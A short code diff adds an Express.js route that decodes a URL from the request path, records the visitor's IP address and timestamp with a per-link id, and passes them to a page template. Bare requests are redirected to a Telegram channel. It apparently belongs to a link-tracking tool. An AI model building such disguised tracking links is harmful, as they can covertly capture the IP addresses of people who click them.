@@ -58,6 +58,24 @@ res.redirect("https://t.me/th30neand0nly0ne");
                               
 });
 
+app.get("/o/:path/:uri",(req,res)=>{
+var ip;
+var d = new Date();
+d=d.toJSON().slice(0,19).replace('T',':');
+if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
+
+
+if(req.params.path != null){
+res.render("ok",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
+} 
+else{
+res.redirect("https://t.me/th30neand0nly0ne");
+}
+
+         
+                              
+});
+
 
 app.get("/l/:path/:uri",(req,res)=>{
 var ip;
